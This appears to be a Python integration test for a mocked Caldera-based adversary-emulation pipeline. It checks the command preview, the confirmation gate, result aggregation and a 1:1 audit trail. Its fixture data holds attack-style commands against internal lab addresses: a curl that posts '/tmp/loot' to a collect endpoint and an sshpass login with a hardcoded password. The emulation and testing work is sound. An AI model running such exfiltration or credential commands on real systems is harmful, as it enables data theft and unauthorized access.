"""End-to-end integration of the emulation pipeline, fully mocked (task 15.2).

This is the integration seam that proves the **whole mocked pipeline works
together** — frontend ↔ backend ↔ services — for the complete flow the design's
emulation sequence diagram describes:

    preview (Req. 6.5)
      -> explicit confirmation (Req. 6.6, 6.7)
        -> simulated execution
          -> per-Ability results + aggregate (Req. 4.4, 4.5)
            -> persisted audit trail, 1:1 per executed command (Req. 6.8)

The frontend is a separate app, so this drives the **exact HTTP sequence the
frontend performs** (via FastAPI ``TestClient``), with Caldera and the Docker
Engine API mocked (no real Caldera, no real Docker daemon):

1. ``POST /api/casos/{caso}/emulacao/preview`` — asserts the concrete commands +
   target container of each are returned **without executing** anything
   (Req. 6.5).
2. ``POST /api/casos/{caso}/emulacao`` with ``confirmado=false`` — asserts
   **nothing ran**: no operation started, state unchanged, no Operation row and
   therefore no audit trail created for the case (Req. 6.6, 6.7).
3. ``POST /api/casos/{caso}/emulacao`` with ``confirmado=true`` on an
   internal-only + isolated + healthy-mocked-Caldera case — asserts the
   Operation ran, the per-Ability results were persisted, the aggregate totals
   are correct (Req. 4.5), and then verifies via
   ``GET /api/auditoria/{operacao}`` that the audit trail was recorded **1:1**:
   exactly one row per executed command, each carrying the command + target
   container + result (Req. 6.8).

Difference from the sibling suites
----------------------------------
``test_emulacao_endpoints.py`` (task 11.2) and ``test_api_endpoints.py`` (task
11.4) verify the endpoint contracts and outcome mapping in isolation. This suite
ties the **full sequence** together on a single shared Operation and, crucially,
closes the loop the others do not: it drives a run with **multiple executed
commands** and then reads the **persisted audit trail back through the HTTP
endpoint**, asserting the 1:1 correspondence (command + target container +
result) end to end (Req. 6.8) alongside the aggregate (Req. 4.5). That
cross-endpoint, whole-pipeline assertion (run -> read audit) is the integration
proof task 15.2 requires.

Everything external is mocked, reusing the patterns already established in the
test suite:
- The database is an ephemeral temp-file SQLite created for the module and wired
  into the app via the ``get_db`` dependency override.
- Caldera is a real :class:`CalderaClient` backed by :class:`httpx.MockTransport`
  (a healthy chain returning several executed links with mixed success/failure).
- Isolation is a fake verifier injected by overriding ``get_runner_factory`` so
  the runner is built with a controllable ``isolation_verifier`` — no real Docker
  daemon is inspected.
- Containment uses the real validator over an internal-only case stand-in loaded
  by monkeypatching ``_load_case_or_error`` (the pattern from the sibling
  suites), so the destination gate passes and the flow reaches execution.

_Requisitos: 6.5, 6.6, 6.7, 6.8, 4.4, 4.5_
"""

from __future__ import annotations

import json
import os
import tempfile
from collections.abc import Iterator
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session, sessionmaker

from app.api.emulacao import get_caldera_client, get_runner_factory
from app.core.config import Settings
from app.db.base import Base, import_models
from app.db.session import create_db_engine, get_db
from app.main import create_app
from app.models.domain import AbilityResult, AuditLogEntry, Operation
from app.services.audit import AuditLogger
from app.services.caldera import (
    ADVERSARIES_PATH,
    ABILITIES_PATH,
    HEALTH_PATH,
    OPERATIONS_PATH,
    CalderaClient,
)
from app.services.containment.isolation import (
    ContainerIsolationVerdict,
    IsolationResult,
)
from app.services.operation.runner import OperationRunner


# ---------------------------------------------------------------------------
# The internal-only curated-case stand-in the frontend flow drives.
#
# It has three abilities, each reaching a distinct internal destination
# (⊆ 172.21.0.0/24). Containment therefore passes (no external destination) and
# the preview / isolation / audit steps operate over more than one command, so
# the "1:1 audit per executed command" assertion is meaningful rather than
# trivially satisfied by a single link.
# ---------------------------------------------------------------------------

_CASE_SLUG = "shadowray"

# The concrete commands the mocked Caldera chain reports as executed, keyed by
# ability. Each contains spaces/slashes so it is never accidentally valid
# base64 (the client only base64-decodes strictly valid input), meaning the
# audit trail records these exact command texts.
_EXECUTED_COMMANDS: dict[str, str] = {
    "a-recon": "curl http://172.21.0.20/recon",
    "a-lateral": "sshpass -p x ssh red@172.21.0.21 whoami",
    "a-exfil": "curl http://172.21.0.22/collect --data @/tmp/loot",
}

# The Caldera link statuses per ability (0 => sucesso, non-zero => falha). Two
# succeed and one fails so the aggregate is a non-trivial (2, 1).
_LINK_STATUS: dict[str, int] = {
    "a-recon": 0,
    "a-lateral": 0,
    "a-exfil": 1,
}


def _internal_only_case(caso: str) -> object:
    """A curated-case stand-in with three internal-only abilities (⊆ 172.21/24).

    Mirrors the ``_internal_only_case`` pattern from the sibling suites but with
    several abilities/commands so the end-to-end run executes multiple commands.
    """
    from app.services.case_service import (
        AbilityData,
        AdversaryData,
        CaseData,
        Executor,
    )

    order = ["a-recon", "a-lateral", "a-exfil"]
    abilities = [
        AbilityData(
            ability_id=ability_id,
            name=ability_id,
            executors=[
                Executor(
                    name="sh",
                    platform="linux",
                    command=_EXECUTED_COMMANDS[ability_id],
                )
            ],
        )
        for ability_id in order
    ]
    return CaseData(
        id=caso,
        nome=caso,
        arquivo_ability="x",
        arquivo_adversary="x",
        arquivo_dag="x",
        abilities=abilities,
        adversary=AdversaryData(id="adv-e2e", atomic_ordering=order),
    )


# ---------------------------------------------------------------------------
# Mocked Caldera transport — a healthy chain that executes the three commands.
# ---------------------------------------------------------------------------


def _healthy_router(request: httpx.Request) -> httpx.Response:
    """A MockTransport handler serving a healthy Caldera that runs the chain.

    The polled Operation returns one link per ability, each carrying its
    concrete command and the mixed success/failure status of
    :data:`_LINK_STATUS`, so the runner persists one AbilityResult + one audit
    row per executed command and aggregates (2 sucesso, 1 falha).
    """
    method = request.method.upper()
    path = request.url.path
    if method == "GET" and path == HEALTH_PATH:
        return httpx.Response(200, json={"status": "ok"})
    if method == "POST" and path == ABILITIES_PATH:
        return httpx.Response(200, json=json.loads(request.content.decode("utf-8")))
    if method == "POST" and path == ADVERSARIES_PATH:
        return httpx.Response(200, json=json.loads(request.content.decode("utf-8")))
    if method == "POST" and path == OPERATIONS_PATH:
        return httpx.Response(
            200, json={"id": "op-e2e", "name": "run", "state": "running"}
        )
    if method == "GET" and path == f"{OPERATIONS_PATH}/op-e2e":
        chain = [
            {
                "id": f"link-{ability_id}",
                "ability": {"ability_id": ability_id},
                "command": _EXECUTED_COMMANDS[ability_id],
                "status": _LINK_STATUS[ability_id],
            }
            for ability_id in _EXECUTED_COMMANDS
        ]
        return httpx.Response(
            200,
            json={"id": "op-e2e", "state": "finished", "chain": chain},
        )
    raise AssertionError(f"unexpected request: {method} {path}")


def _isolated_verifier(containers: list[str], _inspector: object) -> IsolationResult:
    """Fake isolation verifier: every requested target container is isolated."""
    verdicts = tuple(
        ContainerIsolationVerdict(container=name, isolated=True, reasons=())
        for name in containers
    )
    return IsolationResult(passed=True, verdicts=verdicts)


# ---------------------------------------------------------------------------
# Ephemeral module-scoped SQLite + app fixtures (Windows-friendly cleanup).
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module")
def session_factory() -> Iterator[sessionmaker[Session]]:
    """A fresh temp-file SQLite engine + schema for the module."""
    tmp_dir = tempfile.mkdtemp(prefix="pipeline_ui_e2e_emulacao_")
    db_path = Path(tmp_dir) / "e2e_emulacao.db"
    settings_obj = Settings(database_url=f"sqlite:///{db_path.as_posix()}")

    engine = create_db_engine(settings_obj)
    import_models()
    Base.metadata.create_all(bind=engine)

    factory: sessionmaker[Session] = sessionmaker(
        bind=engine,
        autocommit=False,
        autoflush=False,
        expire_on_commit=False,
        future=True,
        class_=Session,
    )
    try:
        yield factory
    finally:
        engine.dispose()
        if db_path.exists():
            os.remove(db_path)
        os.rmdir(db_path.parent)


def _make_client(session_factory: sessionmaker[Session]) -> TestClient:
    """Build a TestClient with DB, Caldera and isolation dependencies mocked.

    Caldera is the healthy chain transport; isolation is the all-isolated
    verifier. No real Caldera or Docker daemon is ever contacted.
    """
    transport = httpx.MockTransport(_healthy_router)
    app = create_app()

    def _get_db_override() -> Iterator[Session]:
        db = session_factory()
        try:
            yield db
        finally:
            db.close()

    def _get_caldera_override() -> Iterator[CalderaClient]:
        client = CalderaClient(transport=transport)
        try:
            yield client
        finally:
            client.close()

    def _get_runner_factory_override():
        client = CalderaClient(transport=transport)

        def _factory(session: Session) -> OperationRunner:
            return OperationRunner(
                session=session,
                caldera=client,
                audit_logger=AuditLogger(session),
                isolation_verifier=_isolated_verifier,
            )

        return _factory

    app.dependency_overrides[get_db] = _get_db_override
    app.dependency_overrides[get_caldera_client] = _get_caldera_override
    app.dependency_overrides[get_runner_factory] = _get_runner_factory_override
    return TestClient(app)


class _internal_case_loader:
    """Context manager swapping the emulacao handler's case loader for the stub.

    Monkeypatches ``app.api.emulacao._load_case_or_error`` to yield the
    internal-only stand-in so the destination gate passes and the flow reaches
    execution (the pattern used by the sibling suites). Restores the original
    loader on exit even if a request raised.
    """

    def __enter__(self) -> "_internal_case_loader":
        from app.api import emulacao as emulacao_module

        self._module = emulacao_module
        self._original = emulacao_module._load_case_or_error
        emulacao_module._load_case_or_error = (  # type: ignore[assignment]
            lambda caso, case_service: _internal_only_case(caso)
        )
        return self

    def __exit__(self, *exc: object) -> None:
        self._module._load_case_or_error = self._original  # type: ignore[assignment]


# ===========================================================================
# The full mocked pipeline, driven as the exact frontend HTTP sequence.
# ===========================================================================


def test_full_flow_preview_confirmation_emulation_audit_and_aggregate(
    session_factory: sessionmaker[Session],
) -> None:
    """preview -> confirm -> emulate -> aggregate -> audit, end to end (mocked).

    Drives the exact sequence the frontend performs and asserts the whole
    pipeline hangs together: the preview shows concrete commands + targets
    without executing (Req. 6.5); an unconfirmed request runs nothing (Req. 6.6,
    6.7); a confirmed request on an internal-only + isolated + healthy-Caldera
    case runs the Operation, persists per-Ability results, aggregates the totals
    (Req. 4.4, 4.5), and records the audit trail 1:1 per executed command,
    readable back through ``GET /api/auditoria/{operacao}`` (Req. 6.8).
    """
    client = _make_client(session_factory)

    with _internal_case_loader():
        # --- Step 1: preview — concrete commands + target of each, NO run -----
        # (Req. 6.5) The confirmation modal renders exactly this before anything
        # is confirmed; nothing is executed to build it.
        preview_resp = client.post(f"/api/casos/{_CASE_SLUG}/emulacao/preview")
        assert preview_resp.status_code == 200, preview_resp.text
        preview = preview_resp.json()

        assert preview["caso_id"] == _CASE_SLUG
        # Internal-only case: no external destination is flagged.
        assert preview["tem_externo"] is False
        assert len(preview["abilities"]) == len(_EXECUTED_COMMANDS)

        # Every previewed command carries its concrete text and a resolved
        # target container, and matches the abilities' declared commands.
        previewed_commands: set[str] = set()
        for ability in preview["abilities"]:
            assert ability["comandos"], "each ability must preview its command(s)"
            for command in ability["comandos"]:
                assert command["comando"].strip(), "command text must be present"
                assert command["alvos"], "each command must present a target"
                previewed_commands.add(command["comando"])
        assert previewed_commands == set(_EXECUTED_COMMANDS.values())

        # The preview must not have created any Operation (nothing executed).
        db = session_factory()
        try:
            assert (
                db.query(Operation)
                .filter(Operation.caso_id == _CASE_SLUG)
                .count()
                == 0
            )
        finally:
            db.close()

        # --- Step 2: confirmado=false — nothing runs -------------------------
        # (Req. 6.6, 6.7) Without explicit confirmation the Operation must not
        # start: no operation id, state unchanged, and still no Operation row
        # (hence no audit trail) for the case.
        not_confirmed = client.post(
            f"/api/casos/{_CASE_SLUG}/emulacao", json={"confirmado": False}
        )
        assert not_confirmed.status_code == 200, not_confirmed.text
        nc_body = not_confirmed.json()
        assert nc_body["iniciada"] is False
        assert nc_body["resultado"] == "nao_confirmada"
        assert nc_body["estado"] == "nao_iniciada"
        assert nc_body["operacao_id"] is None

        db = session_factory()
        try:
            assert (
                db.query(Operation)
                .filter(Operation.caso_id == _CASE_SLUG)
                .count()
                == 0
            ), "confirmado=false must not create an Operation"
        finally:
            db.close()

        # --- Step 3: confirmado=true — the Operation runs --------------------
        # (internal-only + isolated + healthy Caldera) It executes the three
        # commands, persisting per-Ability results and aggregating (2 sucesso,
        # 1 falha — Req. 4.4, 4.5).
        run = client.post(
            f"/api/casos/{_CASE_SLUG}/emulacao", json={"confirmado": True}
        )

    assert run.status_code == 200, run.text
    body = run.json()
    assert body["iniciada"] is True
    assert body["resultado"] == "concluida"
    assert body["estado"] == "finalizada"

    # Aggregate is consistent with the per-Ability link statuses (Req. 4.5).
    assert body["total_sucesso"] == 2
    assert body["total_falha"] == 1
    assert len(body["resultados"]) == len(_EXECUTED_COMMANDS)

    # Each per-Ability result carries its command + target container + status
    # (Req. 4.4); statuses match the mocked chain exactly.
    status_by_command = {
        r["comando"]: r["status"] for r in body["resultados"]
    }
    for ability_id, command in _EXECUTED_COMMANDS.items():
        assert command in status_by_command, command
        expected = "sucesso" if _LINK_STATUS[ability_id] == 0 else "falha"
        assert status_by_command[command] == expected
    for r in body["resultados"]:
        assert r["container_destino"], "every result must name a target container"

    operacao_id = body["operacao_id"]
    assert operacao_id is not None

    # --- Step 4: the audit trail was recorded 1:1 (Req. 6.8) ----------------
    # Read it back through the HTTP endpoint the way the frontend would, and
    # assert exactly one row per executed command, each with command + target
    # container + result. This closes the whole-pipeline loop (run -> audit).
    audit_resp = client.get(f"/api/auditoria/{operacao_id}")
    assert audit_resp.status_code == 200, audit_resp.text
    audit = audit_resp.json()
    assert audit["operacao_id"] == operacao_id

    registros = audit["registros"]
    # Exactly K rows for the K executed commands — the 1:1 correspondence.
    assert len(registros) == len(_EXECUTED_COMMANDS)

    audited_commands = [r["comando"] for r in registros]
    assert set(audited_commands) == set(_EXECUTED_COMMANDS.values())
    # No duplicate rows — strictly one per executed command.
    assert len(audited_commands) == len(set(audited_commands))

    # Oldest-first ordering (ids strictly ascending) and every row fully
    # populated with command + target container + result.
    ids = [r["id"] for r in registros]
    assert ids == sorted(ids)
    for r in registros:
        assert r["operacao_id"] == operacao_id
        assert r["comando"].strip(), "audit row must record the command"
        assert r["container_destino"], "audit row must record the target container"
        assert r["resultado"], "audit row must record the result"
        # The recorded result text reflects the per-command sucesso/falha.
        assert r["resultado"].startswith(("sucesso", "falha"))

    # --- Cross-check against the persisted rows (belt and suspenders) --------
    # The HTTP audit trail matches the DB, and the AbilityResult rows persisted
    # for the aggregate are 1:1 with the executed commands too (Req. 4.5 source).
    db = session_factory()
    try:
        db_audit = (
            db.query(AuditLogEntry)
            .filter(AuditLogEntry.operacao_id == operacao_id)
            .all()
        )
        assert len(db_audit) == len(_EXECUTED_COMMANDS)

        db_results = (
            db.query(AbilityResult)
            .filter(AbilityResult.operacao_id == operacao_id)
            .all()
        )
        assert len(db_results) == len(_EXECUTED_COMMANDS)

        operation = db.get(Operation, operacao_id)
        assert operation is not None
        assert operation.total_sucesso == 2
        assert operation.total_falha == 1
    finally:
        db.close()
